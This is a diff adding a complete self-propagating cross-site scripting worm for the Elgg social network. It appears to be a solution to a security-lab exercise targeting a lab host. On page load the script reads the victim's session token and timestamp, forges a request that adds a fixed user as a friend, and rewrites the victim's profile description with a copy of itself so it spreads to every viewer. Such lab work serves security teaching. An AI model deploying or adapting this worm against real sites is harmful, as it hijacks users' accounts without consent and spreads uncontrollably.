@@ -1,0 +1,39 @@
+<script type='text/javascript' id="worm">
+window.onload=function() {
+    //JavaScript code to access uer name, user guid, Time Stamp,__elgg_ts
+    //and Security Token __elgg_token
+    var userName=elgg.session.user.name;
+    var guid="&guid="+elgg.session.user.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    var briefdesc="&briefdescription=Samy+is+my+Hero"+"&accesslevel[briefdescription]=2";
+    var name="&name="+userName;
+    var jsCode="<script type='text/javascript' id=worm>".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
+    var wormCode=encodeURIComponent(jsCode);
+    var desc="&description=".concat(wormCode).concat("&accesslevel[briefdescription]=2");
+    //Construct the content of the url
+    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+    var content=token+ts+name+desc+briefdesc+guid; //FILL-IN
+    var samyGuid=47; //FILL-IN
+    if(elgg.session.user.guid!=samyGuid)
+    {
+        var Ajax = null;
+        var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token="+elgg.security.token.__elgg_token;
+        //Construct the HTTP request to add Samy as a Friend
+        var sendfriendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;
+        //Create and send Ajax request to add friend
+        Ajax= new XMLHttpRequest();
+        Ajax.open("GET",sendfriendurl,true);
+        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        Ajax.send();
+        //create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST",sendurl,true);
+        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        Ajax.send(content);
+        }
+    }
+</script>
